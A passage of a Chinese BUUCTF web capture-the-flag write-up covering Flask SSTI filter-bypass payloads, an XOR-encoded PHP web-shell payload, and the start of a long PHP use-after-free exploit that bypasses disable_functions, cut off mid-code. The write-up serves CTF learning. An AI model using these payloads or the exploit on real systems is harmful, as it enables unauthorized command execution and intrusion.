<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>BUUCTF Web Writeup 3 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="BUUCTF Web Writeup 3 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/04/08/BUUCTF3/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-04-08T15:47:22.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/In-Challenge/">In Challenge</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>April</span>
            <span>8,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">BUUCTF Web Writeup 3</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>看题目就知道是Flask框架：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666573336081-2e3375bc-6b40-468e-b415-ff8264274505.png#averageHue=%23eaeaea&clientId=uf835df04-24de-4&from=paste&height=461&id=ub30f5767&name=image.png&originHeight=576&originWidth=1757&originalType=binary&ratio=1&rotation=0&showTitle=false&size=87839&status=done&style=none&taskId=u5fe44a8d-73fa-4125-b396-229bab4b32d&title=&width=1405.6" alt="image.png"><br>一个简易加密框，还有个解密框，对应的是base64加解密，提示里面没东西<br>经过测试，将<code>&#123;&#123;1+1&#125;&#125;</code>加密后，放到解密框：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666573389307-89edf548-ad94-42c7-bfb5-fd16eb2a4c36.png#averageHue=%23f7f6f6&clientId=uf835df04-24de-4&from=paste&height=413&id=u59686e7f&name=image.png&originHeight=516&originWidth=1616&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69744&status=done&style=none&taskId=ue83a9eb1-3eef-48f8-9e89-ffda1e3aa71&title=&width=1292.8" alt="image.png"><br>答案为2，存在SSTI注入，经过一系列的测试，发现目标ban掉了os,popen,request<br>但是没ban连接符，那等于没ban，直接放payload<br><code>&#123;&#123;url_for.__globals__.get('o'+'s')['po'+'pen']('cat /this_is_the_fl'+'ag.txt').read()&#125;&#125;</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666573437606-5025ee86-0b17-43b3-a0ac-e5ba5f676d7e.png#averageHue=%23faf8ec&clientId=uf835df04-24de-4&from=paste&height=94&id=u3df9180e&name=image.png&originHeight=117&originWidth=1415&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16120&status=done&style=none&taskId=u93bd695f-704c-4bd4-ac73-d9ad39784a6&title=&width=1132" alt="image.png"></p>
<p>后面看了一下网上的WP，大致思路和我的差不多，其实可以读到一些源码，提示里说了失败是成功之母，那就是让他报错：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666573965550-db3866f2-293b-4f60-a18b-1fd37b292481.png#averageHue=%23fcfbf9&clientId=uf835df04-24de-4&from=paste&height=334&id=u17094b15&name=image.png&originHeight=418&originWidth=975&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30703&status=done&style=none&taskId=u487333fb-5dcd-424b-8584-532062e2eec&title=&width=780" alt="image.png"><br>不读也无所谓，附上一个使用catch_warning的payload<br><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code><br>EZEZ</p>
<h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><p>本以为这题没什么，实际上感觉还挺有意思的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br></pre></td></tr></table></figure>
<p>源码很简单无字母RCE，这我就不多说了，然后捏：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=eval($_POST[%27cmd%27])</span><br></pre></td></tr></table></figure>

<p>这就是我们的payload，利用了异或，这不难理解，之后可以执行phpinfo：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666580623366-ba1c7c85-453c-4e4b-9de0-3d86b3fcf527.png#averageHue=%23dbd4af&clientId=uc30e6127-18cb-4&from=paste&height=169&id=uf194fde8&name=image.png&originHeight=211&originWidth=1267&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39492&status=done&style=none&taskId=u4f32b437-ccac-44e8-901a-e0e818a24ed&title=&width=1013.6" alt="image.png"><br>之后访问一下蚁剑：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666580658588-a9000e2e-6466-4175-a150-107161f9f3bd.png#averageHue=%23efefef&clientId=uc30e6127-18cb-4&from=paste&height=70&id=ue04ac655&name=image.png&originHeight=87&originWidth=984&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7364&status=done&style=none&taskId=u4c3e7f92-0aaa-43f2-8ce0-75f955286cd&title=&width=787.2" alt="image.png"><br>flag文件没有读的权限，预计是要执行readflag，但是由于ban掉的函数很多，导致我们无法去执行！所以在这里就产生了几种payload，接下来是我的愚见哈：<br>方法一：<br>利用UAF（pwn)：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ 